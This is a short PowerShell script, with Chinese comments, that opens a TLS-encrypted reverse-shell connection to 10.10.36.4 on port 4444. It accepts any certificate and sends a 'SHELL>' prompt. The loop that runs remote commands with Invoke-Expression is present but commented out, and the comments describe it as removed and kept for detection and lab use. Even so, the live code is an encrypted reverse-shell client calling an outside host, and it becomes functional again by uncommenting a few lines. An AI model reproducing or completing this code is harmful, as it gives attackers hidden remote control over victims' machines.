# 參數與通道建立（TLS）
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12
$tcpClient    = New-Object Net.Sockets.TcpClient('10.10.36.4', 4444)
$netStream    = $tcpClient.GetStream()
$sslStream    = New-Object Net.Security.SslStream(
    $netStream,
    $false,
    { $true }   # LAB 專用：接受任何憑證
)

$sslStream.AuthenticateAsClient(
    '<SNI-Host>',
    $null,
    $sslProtocols,
    $false
)

if (-not $sslStream.IsEncrypted -or -not $sslStream.IsSigned) {
    $sslStream.Close(); return
}

$writer = New-Object IO.StreamWriter($sslStream)
$writer.AutoFlush = $true

function Write-ToStream($text) {
    [byte[]]$script:Buffer = New-Object byte[] 4096
    $writer.Write($text + 'SHELL> ')
    $writer.Flush()
}

Write-ToStream ''

# ⇩⇩ 危險區塊：讀取對端「指令」並執行 —— 已移除，改留為偵測提示 ⇩⇩
# while (($bytes = $sslStream.Read($Buffer,0,$Buffer.Length)) -gt 0) {
#     $cmd = [Text.Encoding]::UTF8.GetString($Buffer,0,$bytes)  # 正常做法應修剪 CR/LF
#     # DANGEROUS: 這裡原本用 Invoke-Expression 執行遠端字串
#     # $out = Invoke-Expression $cmd 2>&1 | Out-String
#     # Write-ToStream $out
# }

$writer.Close()
$sslStream.Close()
$netStream.Close()
$tcpClient.Close()
